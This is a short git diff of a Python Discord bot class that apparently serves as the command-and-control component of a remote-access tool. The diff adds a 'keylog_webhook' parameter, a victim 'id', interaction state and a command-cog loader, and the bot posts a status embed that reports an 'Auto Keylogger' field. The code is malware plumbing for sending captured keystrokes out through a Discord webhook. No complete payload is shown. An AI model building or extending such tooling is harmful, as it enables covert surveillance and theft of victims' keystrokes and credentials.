@@ -5,9 +5,13 @@ from datetime import datetime
 from libraries import maciassdopia
 
 class BOT(commands.Bot):
-    def __init__(self, channel:int, guild:discord.Object):
+    def __init__(self, channel:int, guild:discord.Object, id:str, keylog_webhook:str):
         self.channel = channel
         self.guild = guild
+        self.id = id
+        self.keylog_webhook = keylog_webhook
+
+        self.active_interactions = False
 
         self.msg = None
         self.color = None
@@ -18,7 +22,6 @@ class BOT(commands.Bot):
         
 
     async def on_ready(self):
-        await self.tree.sync()
         await self.wait_until_ready()
 
         self.channel = self.get_channel(self.channel)
@@ -36,9 +39,10 @@ class BOT(commands.Bot):
         my_embed.add_field(name = "**Auto Keylogger**", value = False, inline = True)
 
         await self.channel.send(embed = my_embed)
-
     
+
     async def setup_hook(self):
+        await self.load_extension("code.discord.cogs.commands")
         await self.tree.sync(guild = self.guild)
 
         
